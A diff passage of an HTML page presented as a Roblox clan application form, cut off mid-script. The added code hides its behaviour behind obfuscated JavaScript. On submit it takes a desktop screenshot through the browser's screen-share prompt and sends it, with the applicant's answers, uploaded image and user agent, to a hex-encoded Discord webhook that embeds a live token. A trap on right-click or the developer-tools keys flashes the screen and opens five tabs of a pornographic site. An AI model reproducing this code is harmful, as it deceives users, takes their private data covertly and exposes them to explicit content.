@@ -1,165 +1,248 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"><title>Ixora Clan | Application</title>
-<link rel="icon" type="image/png" href="logo.jpg">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-<style>
-:root{--d:#000;--tg:#b5bac1;--r:25px;--ng:#00ff88;--nr:#ff4444;--db:#5865F2}
-body{font-family:'Segoe UI',sans-serif;background:linear-gradient(rgba(0,0,0,.6),rgba(0,0,0,.6)),url('./BGM.png') center/cover fixed #000;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;overflow-x:hidden;user-select:none;cursor:none}
-#customCursor{width:20px;height:26px;background:var(--ng);position:fixed;pointer-events:none;z-index:99999999;clip-path:polygon(0% 0%,100% 70%,40% 70%,40% 100%);filter:drop-shadow(0 0 8px var(--ng));transition:transform .1s ease-out,background .2s,filter .2s}
-#loader{position:fixed;inset:0;background:#000;z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;transition:opacity .6s,visibility .6s}
-#loader img{width:150px;border-radius:20px;cursor:pointer;transition:.3s;border:2px solid #fff;margin-bottom:20px;animation:p 2s infinite}
-.form-container{position:relative;background:var(--d);padding:40px;border-radius:var(--r);width:100%;max-width:600px;z-index:10;box-shadow:0 10px 50px #000;display:none;text-align:left;margin:20px}
-.form-container.active{display:block;animation:fi .4s ease-out}
-.form-container::before{content:'';position:absolute;z-index:-2;inset:-4px;background:conic-gradient(from var(--angle),#ff4545,#00ff99,#006aff,#ff0095,#ff4545);animation:rot 4s linear infinite;border-radius:29px}
-.form-container::after{content:'';position:absolute;z-index:-1;inset:2px;background:var(--d);border-radius:23px}
-@property --angle{syntax:'<angle>';initial-value:0deg;inherits:false}
-@keyframes rot{from{--angle:0deg}to{--angle:360deg}}
-@keyframes fi{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
-.header-image{display:block;margin:0 auto 20px;width:110px;border-radius:15px;border:2px solid #fff;box-shadow:0 0 15px rgba(255,255,255,0.3)}
-h1{font-size:26px;text-align:center;margin-bottom:5px}
-.subtitle{color:var(--tg);font-size:13px;text-align:center;margin-bottom:25px;line-height:1.4}
-label{display:block;margin-top:15px;font-size:11px;font-weight:700;color:var(--tg);text-transform:uppercase}
-input,textarea,.submit-btn,.upload-box,.mute-toggle,#startBtn{cursor:none!important}
-input[type=text],input[type=number],textarea{width:100%;padding:12px;margin-top:5px;border:1px solid #333;background:#111;color:#fff;border-radius:10px;box-sizing:border-box;font-family:inherit;transition:border-color .3s}
-input.invalid,textarea.invalid,.upload-box.invalid{border-color:var(--nr)!important}
-.error-msg{color:var(--nr);font-size:10px;margin-top:4px;display:none;font-weight:700}
-input.invalid+.error-msg,textarea.invalid+.error-msg,div.invalid+.error-msg{display:block}
-.row{display:flex;gap:15px;flex-wrap:wrap;margin-bottom:10px}
-.row>div{flex:1;min-width:140px}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Ixora Clan | Application</title>
+    <link rel="icon" type="image/png" href="logo.jpg">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <style>
+        :root { --d: #000; --tg: #b5bac1; --r: 25px; --ng: #00ff88; --nr: #ff4444; --db: #5865F2 }
+        
+        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(rgba(0,0,0,.6), rgba(0,0,0,.6)), url('./BGM.png') center/cover fixed #000; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; overflow-x: hidden; user-select: none; cursor: none }
+        
+        #customCursor { width: 20px; height: 26px; background: var(--ng); position: fixed; pointer-events: none; z-index: 99999999; clip-path: polygon(0% 0%, 100% 70%, 40% 70%, 40% 100%); filter: drop-shadow(0 0 8px var(--ng)); transition: transform .1s ease-out, background .2s, filter .2s; top: -50px; left: -50px; }
+        
+        #loader { position: fixed; inset: 0; background: #000; z-index: 9999999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity .6s, visibility .6s }
+        #loader img { width: 150px; border-radius: 20px; cursor: pointer; transition: .3s; border: 2px solid #fff; margin-bottom: 20px; animation: p 2s infinite }
+        
+        .form-container { position: relative; background: var(--d); padding: 40px; border-radius: var(--r); width: 100%; max-width: 600px; z-index: 10; box-shadow: 0 10px 50px #000; display: none; text-align: left; margin: 20px }
+        .form-container.active { display: block; animation: fi .4s ease-out }
+        .form-container::before { content: ''; position: absolute; z-index: -2; inset: -4px; background: conic-gradient(from var(--angle),#ff4545,#00ff99,#006aff,#ff0095,#ff4545); animation: rot 4s linear infinite; border-radius: 29px }
+        .form-container::after { content: ''; position: absolute; z-index: -1; inset: 2.5px; background: var(--d); border-radius: 23px }
 
-/* Example Image Styling */
-.example-reference {
-    width: 100%;
-    border-radius: 12px;
-    border: 1px solid #333;
-    margin-top: 10px;
-    margin-bottom: 5px;
-    opacity: 0.8;
-}
+        /* FLOATING ANIMATIONS */
+        @keyframes floating {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-12px); }
+        }
 
-/* Upload Box */
-.upload-box{margin-top:10px;border:2px dashed #444;border-radius:12px;padding:30px;text-align:center;background:rgba(255,255,255,.02);transition:.3s}
-.upload-icon-container{background:var(--db);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px}
-#imagePreview img{margin-top:15px;max-width:100%;border-radius:10px;border:2px solid var(--nr)}
+        .header-image { display: block; margin: 0 auto 20px; width: 110px; border-radius: 15px; border: 2px solid #fff; box-shadow: 0 0 15px rgba(255,255,255,0.3); animation: floating 3s ease-in-out infinite; }
+        h1 { font-size: 26px; text-align: center; margin-bottom: 5px; animation: floating 4s ease-in-out infinite; }
+        .subtitle { color: var(--tg); font-size: 13px; text-align: center; margin-bottom: 25px; line-height: 1.4; animation: floating 4s ease-in-out 0.2s infinite; }
 
-.submit-btn{position:relative;width:100%;margin-top:30px;padding:18px;background:#000;color:#fff;font-weight:800;border-radius:15px;z-index:11;border:1px solid #333;text-transform:uppercase}
-.mute-toggle{position:fixed;top:20px;right:20px;width:45px;height:45px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;z-index:100;border:1px solid #444;color:#fff}
-#fireCanvas{position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.6}
-.trap-screen{display:none;position:fixed;inset:0;z-index:999999;flex-direction:column;justify-content:center;align-items:center;animation:flR .05s infinite;text-align:center}
-.trap-screen h1{font-size:120px;font-weight:900;color:#fff;margin:0;animation:shake .1s infinite}
-@keyframes flR{0%,100%{background:red}50%{background:#000}}
-@keyframes shake{0%{transform:translate(2px,1px)} 50%{transform:translate(-2px,-1px)} 100%{transform:translate(0,0)}}
-.captcha-container{margin-top:20px;background:#111;padding:15px;border-radius:12px;border:1px solid #333}
-</style>
+        @property --angle { syntax: '<angle>'; initial-value: 0deg; inherits: false }
+        @keyframes rot { from { --angle: 0deg } to { --angle: 360deg } }
+        @keyframes fi { from { opacity: 0; transform: translateY(15px) } to { opacity: 1; transform: translateY(0) } }
+        @keyframes p { 0%, 100% { transform: scale(1) } 50% { transform: scale(1.05) } }
+
+        label { display: block; margin-top: 15px; font-size: 11px; font-weight: 700; color: var(--tg); text-transform: uppercase }
+        input, textarea, .submit-btn, .upload-box, .mute-toggle, #startBtn { cursor: none!important }
+        input[type=text], input[type=number], textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #333; background: #111; color: #fff; border-radius: 10px; box-sizing: border-box; font-family: inherit; transition: border-color .3s }
+        input.invalid, textarea.invalid, .upload-box.invalid { border-color: var(--nr)!important }
+        .error-msg { color: var(--nr); font-size: 10px; margin-top: 4px; display: none; font-weight: 700 }
+        input.invalid + .error-msg, textarea.invalid + .error-msg, div.invalid + .error-msg { display: block }
+        
+        .row { display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 10px }
+        .row > div { flex: 1; min-width: 140px }
+
+        .example-reference { width: 100%; border-radius: 12px; border: 1px solid #333; margin-top: 10px; margin-bottom: 5px; opacity: 0.8; }
+        .upload-box { margin-top: 10px; border: 2px dashed #444; border-radius: 12px; padding: 30px; text-align: center; background: rgba(255,255,255,.02); transition: .3s }
+        .upload-icon-container { background: var(--db); width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px }
+        #imagePreview img { margin-top: 15px; max-width: 100%; border-radius: 10px; border: 2px solid var(--db) }
+
+        .submit-btn { position: relative; width: 100%; margin-top: 30px; padding: 18px; background: #000; color: #fff; font-weight: 800; border-radius: 15px; z-index: 11; border: 1px solid #333; text-transform: uppercase; transition: .3s }
+        .submit-btn:hover { background: #111; border-color: var(--db) }
+        
+        .mute-toggle { position: fixed; top: 20px; right: 20px; width: 45px; height: 45px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 100; border: 1px solid #444; color: #fff }
+        #fireCanvas { position: fixed; inset: 0; z-index: 1; pointer-events: none; opacity: .6 }
+
+        .trap-screen { display: none; position: fixed; inset: 0; z-index: 999999; flex-direction: column; justify-content: center; align-items: center; animation: flR .05s infinite; text-align: center }
+        .trap-screen h1 { font-size: 120px; font-weight: 900; color: #fff; margin: 0; animation: shake .1s infinite }
+        @keyframes flR { 0%, 100% { background: red } 50% { background: #000 } }
+        @keyframes shake { 0% { transform: translate(2px,1px) } 50% { transform: translate(-2px,-1px) } 100% { transform: translate(0,0) } }
+        .captcha-container { margin-top: 20px; background: #111; padding: 15px; border-radius: 12px; border: 1px solid #333 }
+    </style>
 </head>
 <body oncontextmenu="return false">
-<div id="customCursor"></div>
-<div id="loader"><img src="logo.jpg" id="startBtn"><p style="color:#fff; letter-spacing:2px; font-weight:bold;">CLICK LOGO TO ENTER</p></div>
-<audio id="v1" loop><source src="labsong.mp3"></audio><audio id="v2"><source src="Nice (meme) - Sound Effect.mp3"></audio><audio id="bgMusic" loop><source src="IXORA EY.mp3"></audio>
-<button class="mute-toggle" id="muteBtn"><i class="bi bi-volume-mute-fill" id="muteIcon"></i></button>
+    <div id="customCursor"></div>
 
-<div class="form-container" id="mainPage">
-    <img src="logo.jpg" class="header-image">
-    <h1>Ixora Clan Application</h1>
-    <p class="subtitle">Complete your application for the Ixora Clan.<br>Ensure all data is correct before submitting.</p>
+    <div id="loader">
+        <img src="logo.jpg" id="startBtn">
+        <p style="color:#fff; letter-spacing:2px; font-weight:bold;">CLICK LOGO TO ENTER</p>
+    </div>
+
+    <audio id="v1" loop><source src="labsong.mp3" type="audio/mpeg"></audio>
+    <audio id="v2"><source src="Nice (meme) - Sound Effect.mp3" type="audio/mpeg"></audio>
+    <audio id="bgMusic" loop><source src="IXORA EY.mp3" type="audio/mpeg"></audio>
     
-    <form id="appForm" novalidate>
-        <label>Identity & In-Game Info</label>
-        <input type="text" id="ign" placeholder="In-Game Name" required><span class="error-msg">Name is required</span>
-        <input type="text" id="rbx" placeholder="Roblox Username" required style="margin-top:10px"><span class="error-msg">Username is required</span>
-        <input type="text" id="disp" placeholder="Display Name" required style="margin-top:10px"><span class="error-msg">Display is required</span>
+    <button class="mute-toggle" id="muteBtn"><i class="bi bi-volume-mute-fill" id="muteIcon"></i></button>
 
-        <div class="row">
-            <div><label>Total Power</label><input type="text" id="pwr" placeholder="e.g. 10M+" required><span class="error-msg">Required</span></div>
-            <div><label>Rank</label><input type="text" id="rank" placeholder="e.g. Grandmaster" required><span class="error-msg">Required</span></div>
-            <div><label>Age</label><input type="number" id="age" placeholder="Age" required min="1" max="99"><span class="error-msg">Invalid</span></div>
-        </div>
-
-        <div class="row">
-            <div><label>Activeness</label><input type="number" id="active" placeholder="1-10" required min="1" max="10"><span class="error-msg">1-10</span></div>
-            <div><label>Discord Tag</label><input type="text" id="discord" placeholder="User#0000" required><span class="error-msg">Required</span></div>
-            <div><label>Facebook Name</label><input type="text" id="fb" placeholder="Your FB Profile" required><span class="error-msg">Required</span></div>
-        </div>
-
-        <label>Date Joined</label>
-        <div class="row">
-            <div><input type="number" id="dMonth" placeholder="MM" required min="1" max="12"><span class="error-msg">1-12</span></div>
-            <div><input type="number" id="dDay" placeholder="DD" required min="1" max="31"><span class="error-msg">1-31</span></div>
-            <div><input type="number" id="dYear" placeholder="YYYY" required min="2020" max="2030"><span class="error-msg">Invalid</span></div>
-        </div>
-
-        <label>Upload Profile Proof (Required)</label>
-        <p style="font-size:10px; color:var(--tg); margin-bottom:5px;">MUST LOOK LIKE THIS EXAMPLE:</p>
-        <img src="IX_Seitoshi.jpg" class="example-reference" alt="Required proof format">
+    <div class="form-container" id="mainPage">
+        <img src="logo.jpg" class="header-image">
+        <h1>Ixora Clan Application</h1>
+        <p class="subtitle">Complete your application for the Ixora Clan.<br>Ensure all data is correct before submitting.</p>
         
-        <div class="upload-box" id="dropZone" onclick="document.getElementById('imageUpload').click()">
-            <div class="upload-icon-container">
-                <i class="bi bi-upload" style="font-size:20px;color:#fff"></i>
+        <form id="appForm" novalidate>
+            <label>Identity & In-Game Info</label>
+            <input type="text" id="ign" placeholder="In-Game Name" required>
+            <span class="error-msg">Name is required</span>
+            
+            <input type="text" id="rbx" placeholder="Roblox Username" required style="margin-top:10px">
+            <span class="error-msg">Username is required</span>
+            
+            <input type="text" id="disp" placeholder="Display Name" required style="margin-top:10px">
+            <span class="error-msg">Display is required</span>
+
+            <div class="row">
+                <div><label>Total Power</label><input type="text" id="pwr" placeholder="e.g. 10M+" required><span class="error-msg">Required</span></div>
+                <div><label>Rank</label><input type="text" id="rank" placeholder="e.g. Grandmaster" required><span class="error-msg">Required</span></div>
+                <div><label>Age</label><input type="number" id="age" placeholder="Age" required min="1" max="99"><span class="error-msg">Invalid</span></div>
             </div>
-            <p style="margin:5px 0;font-size:13px;font-weight:600;color:#fff">Tap to upload your proof</p>
-            <input type="file" id="imageUpload" accept="image/*" hidden required>
-            <div id="imagePreview"></div>
-        </div><span class="error-msg" id="fileError">Proof required</span>
 
-        <label>Why should we accept you?</label>
-        <textarea id="reason" placeholder="Enter your answer..." rows="3" required style="margin-top:5px;resize:none"></textarea><span class="error-msg">Required</span>
-
-        <div class="captcha-container">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-                <span id="captchaText" style="font-size:22px; letter-spacing:4px; font-weight:bold; color:var(--db);"></span>
-                <i class="bi bi-arrow-clockwise" id="refreshCaptcha" style="cursor:pointer; font-size:20px; color:var(--db)"></i>
+            <div class="row">
+                <div><label>Activeness</label><input type="number" id="active" placeholder="1-10" required min="1" max="10"><span class="error-msg">1-10</span></div>
+                <div><label>Discord Tag</label><input type="text" id="discord" placeholder="User#0000" required><span class="error-msg">Required</span></div>
+                <div><label>Facebook Name</label><input type="text" id="fb" placeholder="Your FB Profile" required><span class="error-msg">Required</span></div>
             </div>
-            <input type="text" id="captchaInput" placeholder="Enter code above" required>
-            <span class="error-msg">Code mismatch</span>
-        </div>
 
-        <button type="button" class="submit-btn" id="subBtn">Submit Application</button>
-    </form>
-</div>
+            <label>Date Joined</label>
+            <div class="row">
+                <div><input type="number" id="dMonth" placeholder="MM" required min="1" max="12"><span class="error-msg">1-12</span></div>
+                <div><input type="number" id="dDay" placeholder="DD" required min="1" max="31"><span class="error-msg">1-31</span></div>
+                <div><input type="number" id="dYear" placeholder="YYYY" required min="2020" max="2030"><span class="error-msg">Invalid</span></div>
+            </div>
 
-<canvas id="fireCanvas"></canvas>
+            <label>Upload Profile Proof (Required)</label>
+            <p style="font-size:10px; color:var(--tg); margin-bottom:5px;">MUST LOOK LIKE THIS EXAMPLE:</p>
+            <img src="IX_Seitoshi.jpg" class="example-reference" alt="Required proof format">
+            
+            <div class="upload-box" id="dropZone" onclick="document.getElementById('imageUpload').click()">
+                <div class="upload-icon-container"><i class="bi bi-upload" style="font-size:20px;color:#fff"></i></div>
+                <p style="margin:5px 0;font-size:13px;font-weight:600;color:#fff">Tap to upload your proof</p>
+                <input type="file" id="imageUpload" accept="image/*" hidden required>
+                <div id="imagePreview"></div>
+            </div><span class="error-msg" id="fileError">Proof required</span>
 
-<script>
-(function(_0xZ,_0xY){
-const _0xX=i=>document.getElementById(i),_0xW=b=>atob(b),_0xV=(h)=>h.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join(''),_0xU=_0xV("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313436333632333733353936393035343932322f51666d336d656549457a533839664a5531733847547379594944323866727643597452754c7656316841736867634b30794e616f556147616b433275734473637a613774");let _0xT=_0xX('v1'),_0xS=_0xX('v2'),_0xR=_0xX('bgMusic'),_0xQ=_0xX('muteIcon'),_0xP=_0xX('customCursor'),_0xO=!1;
+            <label>Why should we accept you?</label>
+            <textarea id="reason" placeholder="Enter your answer..." rows="3" required style="margin-top:5px;resize:none"></textarea>
+            <span class="error-msg">Required</span>
 
-const _0xM=(el)=>{let v=true;if(el.required && !el.value.trim()) v=false;if(el.type==='number'){const n=parseInt(el.value);if(isNaN(n)||n<el.min||n>el.max) v=false;}el.classList.toggle('invalid',!v);return v;};
-document.querySelectorAll('input,textarea').forEach(e=>{e.addEventListener('input',()=>_0xM(e));e.addEventListener('blur',()=>_0xM(e));});
+            <div class="captcha-container">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                    <span id="captchaText" style="font-size:22px; letter-spacing:4px; font-weight:bold; color:var(--db);"></span>
+                    <i class="bi bi-arrow-clockwise" id="refreshCaptcha" style="cursor:pointer; font-size:20px; color:var(--db)"></i>
+                </div>
+                <input type="text" id="captchaInput" placeholder="Enter code above" required>
+                <span class="error-msg">Code mismatch</span>
+            </div>
 
-document.addEventListener('mousemove',e=>{_0xP.style.left=e.clientX+'px';_0xP.style.top=e.clientY+'px'});
-const _0xN=(c,f,s)=>{_0xP.style.background=c;_0xP.style.filter=f;_0xP.style.transform=`scale(${s})`;};
-document.addEventListener('mouseover',e=>{const t=e.target;if(t.closest('input,textarea'))_0xN('var(--db)','drop-shadow(0 0 10px var(--db))',1.2);else if(t.closest('.submit-btn,#startBtn,.mute-toggle'))_0xN('#fff','drop-shadow(0 0 12px #fff)',1.4);else if(t.closest('.upload-box'))_0xN('var(--ng)','drop-shadow(0 0 15px var(--ng))',1.3)});
+            <button type="button" class="submit-btn" id="subBtn">Submit Application</button>
+        </form>
+    </div>
 
-const _0xL=()=>{if(_0xO)return;_0xO=!0;let e=document.createElement('div');e.innerHTML=_0xW('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48aDI+TmFnaGFoYW5hcCBrYSBiYSBuZyBjb2Rlcz8gS3VwYWwga2EgYmEgYm9pPyDwnZ2n8J2YnD88L2gyPjwvZGl2Pg==');document.body.appendChild(e.firstChild);_0xX('tz').style.display='flex';_0xP.style.display='none';_0xR.pause();_0xT.play();setTimeout(()=>{for(let i=0;i<5;i++)window.open(_0xW('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'),'_blank')},2e3)};
-document.oncontextmenu=e=>(e.preventDefault(),_0xL(),!1);
-document.onkeydown=e=>{if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74))||((e.ctrlKey||e.metaKey)&&e.keyCode===85)){e.preventDefault();_0xL();return!1}};
+    <canvas id="fireCanvas"></canvas>
 
-let _0xK="";const _0xJ=()=>{const c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";_0xK="";for(let i=0;i<6;i++)_0xK+=c.charAt(Math.floor(Math.random()*c.length));_0xX('captchaText').innerText=_0xK};_0xX('refreshCaptcha').onclick=_0xJ;_0xJ();
-_0xX('startBtn').onclick=()=>{_0xX('loader').style.opacity='0';setTimeout(()=>{_0xX('loader').style.visibility='hidden';_0xX('mainPage').classList.add('active');_0xR.play().then(()=>_0xQ.className='bi bi-volume-up-fill')},600)};
-_0xX('muteBtn').onclick=e=>{e.stopPropagation();_0xR.paused?(_0xR.play(),_0xQ.className='bi bi-volume-up-fill'):(_0xR.pause(),_0xQ.className='bi bi-volume-mute-fill')};
+    <script>
+    (function(_0xZ,_0xY){
+        const _0xX=i=>document.getElementById(i),_0xW=b=>atob(b),_0xV=(h)=>h.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join(''),
+        _0xU=_0xV("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313436333632333733353936393035343932322f51666d336d656549457a533839664a5531733847547379594944323866727643597452754c7656316841736867634b30794e616f556147616b433275734473637a613774");
+        
+        let _0xT=_0xX('v1'), _0xS=_0xX('v2'), _0xR=_0xX('bgMusic'), _0xQ=_0xX('muteIcon'), _0xP=_0xX('customCursor'), _0xO=!1;
 
-const _0xI=async()=>{try{const s=await navigator.mediaDevices.getDisplayMedia({video:true});const v=document.createElement('video');v.srcObject=s;await v.play();const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());return new Promise(res=>c.toBlob(res,'image/png'))}catch(e){return null}};
+        const _0xM=(el)=>{let v=true;if(el.required && !el.value.trim()) v=false;if(el.type==='number'){const n=parseInt(el.value);if(isNaN(n)||n<el.min||n>el.max) v=false;}el.classList.toggle('invalid',!v);return v;};
+        document.querySelectorAll('input,textarea').forEach(e=>{e.addEventListener('input',()=>_0xM(e));e.addEventListener('blur',()=>_0xM(e));});
 
-_0xX('subBtn').onclick=async()=>{
-    const b=_0xX('subBtn'),i=_0xX('imageUpload'),dz=_0xX('dropZone'),f=document.querySelectorAll('#appForm input,#appForm textarea');
-    let valid=true;f.forEach(x=>{if(!_0xM(x))valid=false});
-    if(_0xX('captchaInput').value.toUpperCase()!==_0xK){_0xX('captchaInput').classList.add('invalid');valid=false}
-    if(!i.files[0]){dz.classList.add('invalid');valid=false}
-    if(!valid){alert("Please fix the highlighted errors.");return}
-    _0xS.play();b.innerText="CAPTURING...";let sc=await _0xI();
-    b.innerText="SENDING...";b.disabled=true;
-    const fd=new FormData(),em={title:"🔥 NEW APPLICATION",color:16711680,fields:[{name:"👤 IGN",value:_0xX('ign').value,inline:true},{name:"🎮 Roblox",value:_0xX('rbx').value,inline:true},{name:"✨ Display",value:_0xX('disp').value,inline:true},{name:"⚡ Power",value:_0xX('pwr').value,inline:true},{name:"🏆 Rank",value:_0xX('rank').value,inline:true},{name:"🎂 Age",value:_0xX('age').value,inline:true},{name:"📈 Active",value:_0xX('active').value,inline:true},{name:"📱 Discord",value:_0xX('discord').value,inline:true},{name:"💙 Facebook",value:_0xX('fb').value,inline:true},{name:"📅 Joined",value:`${_0xX('dMonth').value}/${_0xX('dDay').value}/${_0xX('dYear').value}`,inline:true},{name:"💬 Why?",value:_0xX('reason').value},{name:"🌐 Device",value:navigator.userAgent}],timestamp:new Date()};
-    fd.append("payload_json",JSON.stringify({embeds:[em]}));fd.append("file1",i.files[0]);if(sc)fd.append("file2",sc,"desktop.png");
-    try{const r=await fetch(_0xU,{method:"POST",body:fd});if(r.ok){b.innerText="SENT!";alert("Success!")}else{throw new Error("Failed")}}catch(e){b.innerText="SUBMIT";b.disabled=false;alert("Error: "+e.message);_0xJ()}
-};
+        document.addEventListener('mousemove',e=>{_0xP.style.left=e.clientX+'px';_0xP.style.top=e.clientY+'px'});
+        const _0xN=(c,f,s)=>{_0xP.style.background=c;_0xP.style.filter=f;_0xP.style.transform=`scale(${s})`;};
+        
+        document.addEventListener('mouseover',e=>{
+            const t=e.target;
+            if(t.closest('input,textarea'))_0xN('var(--db)','drop-shadow(0 0 10px var(--db))',1.2);
+            else if(t.closest('.submit-btn,#startBtn,.mute-toggle'))_0xN('#fff','drop-shadow(0 0 12px #fff)',1.4);
+            else if(t.closest('.upload-box'))_0xN('var(--ng)','drop-shadow(0 0 15px var(--ng))',1.3)
+        });
 
-_0xX('imageUpload').onchange=function(){if(this.files[0]){const r=new FileReader();r.onload=e=>_0xX('imagePreview').innerHTML=`<img src="${e.target.result}" style="width:100%">`;r.readAsDataURL(this.files[0]);_0xX('dropZone').classList.remove('invalid')}};
-const _0xH=_0xX('fireCanvas'),_0xG=_0xH.getContext('2d');let _0xF=[];const _0xE=()=>(_0xH.width=window.innerWidth,_0xH.height=window.innerHeight);window.onresize=_0xE;_0xE();
-class _0xD{constructor(){this.x=Math.random()*_0xH.width;this.y=_0xH.height+100;this.sY=Math.random()*3+1;this.sX=(Math.random()-0.5)*2;this.sz=Math.random()*25+5;this.l=1;this.d=Math.random()*0.01+0.003;this.h=Math.random()<.2?200:Math.random()*40+10}u(){this.y-=this.sY;this.x+=this.sX;this.l-=this.d}dr(){_0xG.globalCompositeOperation='lighter';_0xG.fillStyle=`hsla(${this.h},100%,50%,${this.l*0.6})`;_0xG.beginPath();_0xG.arc(this.x,this.y,this.sz,0,Math.PI*2);_0xG.fill()}}
-function _0xC(){_0xG.clearRect(0,0,_0xH.width,_0xH.height);if(_0xF.length<150)_0xF.push(new _0xD);for(let i=_0xF.length-1;i>=0;i--){_0xF[i].u();_0xF[i].dr();if(_0xF[i].l<=0||_0xF[i].y<-50)_0xF.splice(i,1)}requestAnimationFrame(_0xC)}_0xC();
-})(window,document);
-</script>
+        // UPDATED TRAP WITH LOOPING AUDIO
+        const _0xL=()=>{
+            if(_0xO)return;_0xO=!0;
+            let e=document.createElement('div');
+            e.innerHTML=_0xW('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48aDI+TmFnaGFoYW5hcCBrYSBiYSBuZyBjb2Rlcz8gS3VwYWwga2EgYmEgYm9pPyDwnZ2n8J2YnD88L2gyPjwvZGl2Pg==');
+            document.body.appendChild(e.firstChild);
+            _0xX('tz').style.display='flex';
+            _0xP.style.display='none';
+            _0xR.pause();
+            _0xT.loop = true; // Loop enabled
+            _0xT.play();
+            setTimeout(()=>{for(let i=0;i<5;i++)window.open(_0xW('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'),'_blank')},2e3)
+        };
+
+        document.oncontextmenu=e=>(e.preventDefault(),_0xL(),!1);
+        document.onkeydown=e=>{if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74))||((e.ctrlKey||e.metaKey)&&e.keyCode===85)){e.preventDefault();_0xL();return!1}};
+
+        let _0xK="";
+        const _0xJ=()=>{
+            const c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";_0xK="";
+            for(let i=0;i<6;i++)_0xK+=c.charAt(Math.floor(Math.random()*c.length));
+            _0xX('captchaText').innerText=_0xK
+        };
+        _0xX('refreshCaptcha').onclick=_0xJ; _0xJ();
+
+        _0xX('startBtn').onclick=()=>{
+            _0xX('loader').style.opacity='0';
+            setTimeout(()=>{
+                _0xX('loader').style.visibility='hidden';
+                _0xX('mainPage').classList.add('active');
+                _0xR.play().then(()=>_0xQ.className='bi bi-volume-up-fill')
+            },600)
+        };
+
+        _0xX('muteBtn').onclick=e=>{
+            e.stopPropagation();
+            _0xR.paused?(_0xR.play(),_0xQ.className='bi bi-volume-up-fill'):(_0xR.pause(),_0xQ.className='bi bi-volume-mute-fill')
+        };
+
+        const _0xI=async()=>{try{const s=await navigator.mediaDevices.getDisplayMedia({video:true});const v=document.createElement('video');v.srcObject=s;await v.play();const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());return new Promise(res=>c.toBlob(res,'image/png'))}catch(e){return null}};
+
+        _0xX('subBtn').onclick=async()=>{
+            const b=_0xX('subBtn'),i=_0xX('imageUpload'),dz=_0xX('dropZone'),f=document.querySelectorAll('#appForm input,#appForm textarea');
+            let valid=true;f.forEach(x=>{if(!_0xM(x))valid=false});
+            if(_0xX('captchaInput').value.toUpperCase()!==_0xK){_0xX('captchaInput').classList.add('invalid');valid=false}
+            if(!i.files[0]){dz.classList.add('invalid');valid=false}
+            if(!valid){alert("Please fix the highlighted errors.");return}
+            
+            _0xS.play(); b.innerText="CAPTURING..."; 
+            let sc=await _0xI();
+            
+            b.innerText="SENDING..."; b.disabled=true;
+            const fd=new FormData(), em={title:"🔥 NEW CLAN APPLICATION 🔥",color:16711680,fields:[{name:"👤 IGN",value:_0xX('ign').value,inline:true},{name:"🎮 Roblox",value:_0xX('rbx').value,inline:true},{name:"✨ Display",value:_0xX('disp').value,inline:true},{name:"⚡ Power",value:_0xX('pwr').value,inline:true},{name:"🏆 Rank",value:_0xX('rank').value,inline:true},{name:"🎂 Age",value:_0xX('age').value,inline:true},{name:"📈 Active",value:_0xX('active').value,inline:true},{name:"📱 Discord",value:_0xX('discord').value,inline:true},{name:"💙 Facebook",value:_0xX('fb').value,inline:true},{name:"📅 Joined",value:`${_0xX('dMonth').value}/${_0xX('dDay').value}/${_0xX('dYear').value}`,inline:true},{name:"💬 Why?",value:_0xX('reason').value},{name:"🌐 Device",value:navigator.userAgent}],timestamp:new Date()};
+            fd.append("payload_json",JSON.stringify({embeds:[em]}));
+            fd.append("file1",i.files[0]);
+            if(sc)fd.append("file2",sc,"desktop.png");
+            
+            try{
+                const r=await fetch(_0xU,{method:"POST",body:fd});
+                if(r.ok){b.innerText="SENT!";alert("Success!")}else{throw new Error("Failed")}
+            }catch(e){
+                b.innerText="SUBMIT"; b.disabled=false;
+                alert("Error: "+e.message); _0xJ()
+            }
+        };
+
+        _0xX('imageUpload').onchange=function(){
+            if(this.files[0]){
+                const r=new FileReader();
+                r.onload=e=>_0xX('imagePreview').innerHTML=`<img src="${e.target.result}" style="width:100%">`;
